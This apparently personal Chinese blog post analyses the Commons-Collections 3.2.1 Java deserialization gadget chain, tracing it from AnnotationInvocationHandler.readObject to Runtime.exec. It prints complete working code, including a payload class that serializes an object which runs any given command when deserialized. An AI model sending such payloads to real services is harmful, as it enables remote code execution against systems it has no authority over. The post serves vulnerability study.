---
title: Commons-Collections反序列化漏洞分析
date: 2021-12-25
tags:
 - Vulnerabilities
 - 笔记
categories:
 - Vulnerabilities
---

#### 1. InvokerTransformer.transform反射调用

Gadget构造主要利用了其Transformer接口，将一个对象通过transform转换为另一个对象。其中有一个Invoker类型的转换接口InvokerTransformer，实现了Serializable接口

```java
public class InvokerTransformer implements Transformer, Serializable {
...省略...
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();  // 反射获取类
            Method method = cls.getMethod(iMethodName, iParamTypes);  // 反射得到具有对应参数的方法
            return method.invoke(input, iArgs);  // 使用对应参数调用方法，并返回相应调用结果
        } catch (NoSuchMethodException ex) {
...省略...
```

要想利用InvokerTransformer类中的transform()来达到任意命令执行，还需要一个入口点，使得应用在反序列化的时候能够通过一条调用链来触发InvokerTransformer中的transform()接口。

因此就找到了位于TransformedMap类中的checkSetValue()方法：

```java
public class TransformedMap
        extends AbstractInputCheckedMapDecorator
        implements Serializable {
...省略...
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```

TransformedMap实现了Map接口，在对字典键值进行setValue操作时会调用valueTransformer.transform(value)。。这里也就找到了前面反射调用的上一步调用。

为了多次进行反射调用，将InvokerTransformer实例级联在一起组成一个ChainedTransformer对象，在其调用的时候进行一个级联transform()调用：

```java
public class ChainedTransformer implements Transformer, Serializable {
...省略...
    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
```

现在就可以造出一个TransformedMap实例，在对字典键值进行setValue()操作的时候调我们构造的ChainedTransformer：

```java
package exserial.examples;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class SetValueToExec {

    public static void main(String[] args) throws Exception {
        String command = (args.length != 0) ? args[0] : "/bin/sh,-c,open /Applications/Calculator.app";
        String[] execArgs = command.split(",");

        Transformer[] transforms = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[] {String[].class},
                        new Object[] {execArgs}
                )
        };
        Transformer transformerChain = new ChainedTransformer(transforms);
        Map tempMap = new HashMap<String, Object>();
        Map<String, Object> exMap = TransformedMap.decorate(tempMap, null, transformerChain);
        exMap.put("1111", "2222");
        for (Map.Entry<String, Object> exMapValue : exMap.entrySet()) {
            exMapValue.setValue(1);
        }
    }
}
```

目前已经完成了使用TransformedMap进行任意命令执行，要想在Java应用反序列化的过程中触发该过程，还需要找到一个类，它能够在反序列化调用readObject()的时候调用TransformedMap内置类MapEntry中的setValue()函数，这样才能够构成一条完整的Gadget调用链。

恰好在sun.reflect.annotation.AnnotationInvocationHandler类中找到了具有Map类型的参数，并且在readObject()方法中触发了上面所提到的所有条件：

```java
    private void readObject(java.io.ObjectInputStream s) {
        ...省略...
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) {
                    memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + "[" + value + "]").setMember(annotationType.members().get(name)));
                }
            }
        }
    }
```

可以注意到memberValue是AnnotationInvocationHandler类中类型声明为Map<String, Object>的成员变量，刚好和之前构造的TransformedMap类型相符。

因此，我们可以通过Java的反射机制动态获取AnnotationInvocationHandler类，使用构造好的TransformedMap作为它的实例化参数，然后将实例化的AnnotationInvokationHandler进行序列号得到二进制数据，传递给具有相应环境的序列化数据交互接口，触发命令执行的Gadget：

```java
package exserial.payloads;

import java.io.ObjectOutputStream;

import java.util.Map;
import java.util.HashMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;

import exserial.payloads.utils.Serializables;

public class Commons1 {

    public static Object getAnnotationInvocationHandler(String command) throws Exception {
        String[] execArgs = command.split(",");
        Transformer[] transforms = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[] {String[].class},
                        new Object[] {execArgs}
                )
        };
        Transformer transformerChain = new ChainedTransformer(transforms);
        Map tempMap = new HashMap();
        tempMap.put("value", "does't matter");
        Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, exMap);

        return instance;
    }

    public static void main(String[] args) throws Exception {
        String command = (args.length != 0) ? args[0] : "/bin/sh,-c,open /Applications/Calculator.app";

        Object obj = getAnnotationInvocationHandler(command);
        ObjectOutputStream out = new ObjectOutputStream(System.out);
        out.writeObject(obj);
    }
}
```

完整的调用链为：

```
/*
    Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                AbstractInputCheckedMapDecorator$MapEntry.setValue()
                    TransformedMap.checkSetValue()
                        ConstantTransformer.transform()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Class.getMethod()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.getRuntime()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()

    Requires:
        commons-collections <= 3.2.1
*/
```

